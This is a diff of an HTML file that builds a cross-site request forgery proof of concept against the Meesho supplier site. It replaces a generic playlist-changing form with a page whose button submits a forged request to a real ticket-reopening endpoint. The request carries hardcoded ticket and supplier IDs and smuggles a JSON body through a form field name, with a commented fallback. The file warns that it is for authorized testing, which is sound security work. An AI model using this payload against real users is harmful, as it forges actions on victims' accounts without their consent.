@@ -1,10 +1,93 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC - Reopen Meesho Support Ticket (manual click)</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      padding: 40px;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    h1 {
+      color: #c0392b;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    button {
+      background: #e74c3c;
+      color: white;
+      border: none;
+      padding: 14px 28px;
+      font-size: 18px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background: #c0392b;
+    }
+    .info {
+      color: #555;
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+    .warning {
+      color: #8B0000;
+      font-weight: bold;
+    }
+  </style>
+</head>
 <body>
-<h3>Click the button to trigger the CSRF request silently.</h3>
-<form action="https://www.xyz.com/playlist/updatedefault/3879211" method="POST">
-<button type="submit">Change List</button>
-</form>
-<p><i>Victim favorite List change.</i></p>
+
+  <div class="container">
+    <h1>CSRF Demonstration – Reopen Ticket</h1>
+
+    <div class="info">
+      <p>If you are currently logged in to <strong>supplier.meesho.com</strong> in this browser,<br>
+      clicking the button below will attempt to <strong>reopen support ticket #8771534437535</strong>.</p>
+
+      <p class="warning">This is a security test PoC.<br>
+      Only use it on your own account or on targets you have explicit permission to test.</p>
+    </div>
+
+    <!-- The actual CSRF form -->
+    <form id="csrfForm"
+          action="https://supplier.meesho.com/experienceapi/api/support/reopenTicket"
+          method="POST"
+          enctype="application/json">
+
+      <!-- We fake JSON via name/value trick (some parsers accept this abuse) -->
+      <input type="hidden" name='{"ticket_reopening_reason":"test","ticket_id":8771534437535,"s3_attachment_urls":[],"supplier_id":2784913}'
+             value=" " />
+
+      <!-- Some apps ignore extra fields or parse first key as JSON -->
+      <!-- If this doesn't work, the app strictly validates Content-Type → form won't be accepted -->
+
+      <!-- Alternative: if you want to try classic form-urlencoded (less likely to work) -->
+      <!--
+      <input type="hidden" name="ticket_reopening_reason" value="test" />
+      <input type="hidden" name="ticket_id"              value="8771534437535" />
+      <input type="hidden" name="s3_attachment_urls"     value="[]" />
+      <input type="hidden" name="supplier_id"            value="2784913" />
+      -->
+    </form>
+
+    <button type="button" onclick="document.getElementById('csrfForm').submit();">
+      Click here to continue
+    </button>
+
+    <p style="margin-top:30px; color:#777; font-size:0.9em;">
+      After clicking, check your Meesho supplier panel → support tickets.<br>
+      If the ticket was reopened → the endpoint is vulnerable to this form of CSRF.
+    </p>
+  </div>
+
 </body>
 </html>
-
